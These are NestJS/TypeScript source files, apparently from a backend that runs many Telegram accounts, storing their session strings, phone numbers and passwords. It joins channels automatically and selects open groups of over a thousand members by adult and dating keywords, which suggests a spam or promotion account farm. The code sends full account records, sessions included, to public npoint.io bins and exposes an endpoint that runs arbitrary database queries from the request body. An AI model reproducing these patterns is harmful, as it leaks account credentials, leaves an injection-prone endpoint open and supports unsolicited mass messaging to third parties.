console.log(\"Failed to Update as BufferClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await this.telegramService.deleteClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForBufferClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreateBufferClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsString()\n  readonly session: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchBufferClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the bufferClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsOptional()\n  @IsString()\n  readonly session?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\n\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type BufferClientDocument = BufferClient & Document;\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class BufferClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  session: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { BuildService } from './build.service';\n\n@ApiTags('Build')\n@Controller('builds')\nexport class BuildController {\n  constructor(private readonly buildService: BuildService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get build data' })\n  async findOne(): Promise<any>{\n    return this.buildService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update build' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.buildService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BuildService } from './build.service';\nimport { BuildController } from './build.controller';\nimport { BuildSchema } from './builds.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    BuildModule,\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\n    NpointModule,\n  ],\n  providers: [BuildService],\n  controllers: [BuildController],\n  exports: [BuildModule],\n})\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Build } from './builds.schema';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class BuildService {\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\n        private npointSerive: NpointService) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.buildModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.buildModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        try {\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\n            console.log(\"Updated document successfully in npoint\")\n        } catch (error) {\n            console.log(error)\n        }\n        if (!updatedUser) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type BuildDocument = Build & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class Build {}\n\nexport const BuildSchema = SchemaFactory.createForClass(Build);\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","// src/channels/channels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ChannelsService } from './channels.service';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { SearchChannelDto } from './dto/search-channel.dto';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel } from './schemas/channel.schema';\n\n@ApiTags('Channels')\n@Controller('channels')\nexport class ChannelsController {\n  constructor(private readonly channelsService: ChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new  channel' })\n  async create(@Body() createChannelDto: CreateChannelDto) {\n    return this.channelsService.create(createChannelDto);\n  }\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\n    return this.channelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\n    console.log(query);\n    return this.channelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all  channels' })\n  async findAll() {\n    return this.channelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.channelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\n    return this.channelsService.update(channelId, updateChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.channelsService.remove(channelId);\n  }\n}\n","// src/channels/channels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ChannelsService } from './channels.service';\nimport { ChannelsController } from './channels.controller';\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\n  ],\n  controllers: [ChannelsController],\n  providers: [ChannelsService],\n  exports: [ChannelsService]\n})\nexport class ChannelsModule { }\n","// src/channels/channels.service.ts\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\n@Injectable()\nexport class ChannelsService {\n  constructor(\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\n  ) { console.log(Channel.name) }\n\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\n    const createdChannel = new this.ChannelModel(createChannelDto);\n    return createdChannel.save();\n  }\n\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<Channel[]> {\n    return this.ChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<Channel> {\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<Channel[]> {\n    console.log(filter)\n    return this.ChannelModel.find(filter).exec();\n  }\n\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\n    const pattern = new RegExp(keywords.join('|'), 'i');\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\n    let query = {\n      $and: [\n        { username: { $ne: null } },\n        {\n          $or: [\n            { title: { $regex: pattern } },\n            { username: { $regex: pattern } }\n          ]\n        },\n        {\n          username: {\n            $not: {\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\n            }\n          }\n        },\n        {\n          title: { $not: { $regex: notPattern } }\n        },\n        {\n          username: { $not: { $regex: notPattern } }\n        },\n        {\n          sendMessages: false,\n          broadcast: false,\n          restricted: false\n        }\n      ]\n    };\n\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\n    try {\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.ChannelModel.find(query);\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 1000 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = notIds.length > 300 && false ? { randomField: 1 } : { participantsCount: -1 }\n    try {\n      const result: Channel[] = await this.ChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $addFields: { randomField: { $rand: {} } } }, // Add a random field\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateChannelDto {\n  @ApiProperty({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is a broadcast channel',\n    example: null,\n    required: false,\n  })\n  broadcast?: boolean;\n\n  @ApiProperty({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel is a megagroup',\n    example: null,\n    required: false,\n  })\n  megagroup?: boolean;\n\n  @ApiProperty({\n    description: 'Number of participants in the channel',\n    example: 0,\n  })\n  participantsCount: number;\n\n  @ApiProperty({\n    description: 'Whether the channel is restricted',\n    example: null,\n    required: false,\n  })\n  restricted?: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel can send messages',\n    example: null,\n    required: false,\n  })\n  sendMessages?: boolean;\n\n  @ApiProperty({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title: string;\n\n  @ApiProperty({\n    description: 'Username of the channel',\n    example: null,\n    required: false,\n  })\n  username?: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n\n  @ApiProperty({\n    default: false, example: false,\n    required: false,\n  })\n  forbidden: boolean = false;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class SearchChannelDto {\n  @ApiPropertyOptional({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title?: string;\n\n  @ApiPropertyOptional({\n    description: 'privacy of the channel',\n    example: false,\n  })\n  private?: string;\n\n  @ApiPropertyOptional({\n    description: 'Username of the channel',\n    example: 'ayesha_channel',\n  })\n  username?: string;\n\n  @ApiPropertyOptional({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs?: boolean;\n\n  @ApiPropertyOptional({\n    description: 'Minimum number of participants in the channel',\n    example: 10,\n  })\n  minParticipantsCount?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum number of participants in the channel',\n    example: 100,\n  })\n  maxParticipantsCount?: number;\n}\n","// src/channels/dto/update-channel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateChannelDto } from './create-channel.dto';\n\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\n\nexport type ChannelDocument = Channel & Document;\n@Schema({\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Channel {\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @Prop({ required: true })\n  title: string;\n\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @Prop({ required: true, default: false })\n  private: boolean;\n\n  @Prop({ default: false, required: false })\n  forbidden: boolean\n}\n\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) { }\r\n\r\n  /**\r\n   * Create a new client\r\n   */\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.create(createClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Search for clients based on query parameters\r\n   */\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.search(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    this.clientService.updateClient(clientId);\r\n    return \"Update client initiated\";\r\n  }\r\n\r\n  /**\r\n   * Get all clients with masked sensitive fields\r\n   */\r\n  @Get('maskedCls')\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAllMasked(@Query() query: SearchClientDto) {\r\n    try {\r\n      return await this.clientService.findAllMasked(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get all clients\r\n   */\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAll(): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.findAll();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get a specific client by ID\r\n   */\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.findOne(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Update a specific client by ID\r\n   */\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.update(clientId, updateClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Delete a specific client by ID\r\n   */\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.remove(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  // @Get('setupClient/:clientId')\r\n  // @ApiOperation({ summary: 'SetUp Client data' })\r\n  // //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  // //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  // async setupClient(@Param('clientId') clientId: string, @Query() setupClientQueryDto: SetupClientQueryDto) {\r\n  //   this.clientService.setupClient(clientId, setupClientQueryDto);\r\n  //   return `Started Client Seup for ${clientId}`\r\n  // }\r\n\r\n  /**\r\n   * Execute a custom MongoDB query\r\n   */\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\r\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.clientService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Add a mobile number to the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number to the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number added successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.addPromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Remove a mobile number from the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number removed successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.removePromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Client, ClientSchema } from './schemas/client.schema';\nimport { ClientService } from './client.service';\nimport { ClientController } from './client.controller';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { UsersModule } from '../users/users.module';\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\n    forwardRef(()=>TelegramModule),\n    forwardRef(()=>BufferClientModule),\n    forwardRef(()=>UsersModule),\n    forwardRef(()=>ArchivedClientModule),\n    NpointModule\n  ],\n  controllers: [ClientController],\n  providers: [ClientService],\n  exports: [ClientService]\n})\nexport class ClientModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef, Query } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Client, ClientDocument } from './schemas/client.schema';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\nimport { areJsonsNotSame, contains, fetchNumbersFromString, mapToJson,toBoolean } from '../../utils';\nimport { UpdateClientDto } from './dto/update-client.dto';\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\nimport * as path from 'path';\nimport { CloudinaryService } from '../../cloudinary';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { NpointService } from '../n-point/npoint.service';\nimport axios from 'axios';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\nlet settingupClient = Date.now() - 250000;\n@Injectable()\nexport class ClientService {\n    private clientsMap: Map<string, Client> = new Map();\n    private lastUpdateMap: Map<string, number> = new Map(); // Track last update times\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ArchivedClientService))\n        private archivedClientService: ArchivedClientService,\n        private npointSerive: NpointService\n    ) {\n        setInterval(async () => {\n            await this.refreshMap();\n        }, 5 * 60 * 1000);\n    }\n\n    async checkNpoint() {\n        const clients = (await axios.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;\n        for (const client in clients) {\n            const existingClient = await this.findOne(client, false);\n            if (areJsonsNotSame(existingClient, clients[client])) {\n                await this.findAll();\n                const clientData = mapToJson(this.clientsMap)\n                await this.npointSerive.updateDocument(\"7c2682f37bb93ef486ba\", clientData)\n                const maskedCls = {};\n                for (const client in clientData) {\n                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];\n                    maskedCls[client] = maskedClient\n                }\n                await this.npointSerive.updateDocument(\"f0d1e44d82893490bbde\", maskedCls)\n                break;\n            }\n        }\n    }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.clientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const clientMapLength = this.clientsMap.size\n        if (clientMapLength < 20) {\n            const results: Client[] = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean()\n            for (const client of results) {\n                this.clientsMap.set(client.clientId, client)\n            }\n            console.log(\"Refreshed Clients\")\n            return results\n        } else {\n            return Array.from(this.clientsMap.values())\n        }\n    }\n\n    async findAllMasked(query?: SearchClientDto) {\n        const allClients = await this.findAll()\n        const filteredClients = query\n            ? allClients.filter(client => {\n                return Object.keys(query).every(key => client[key] === query[key]);\n            })\n            : allClients;\n        const results = filteredClients.map(client => {\n            const { session, mobile, password, promoteMobile, ...maskedClient } = client;\n            return maskedClient;\n        });\n        return results;\n    }\n\n    async refreshMap() {\n        console.log(\"Refreshed Clients\")\n        this.clientsMap.clear();\n    }\n\n    async findOne(clientId: string, throwErr: boolean = true): 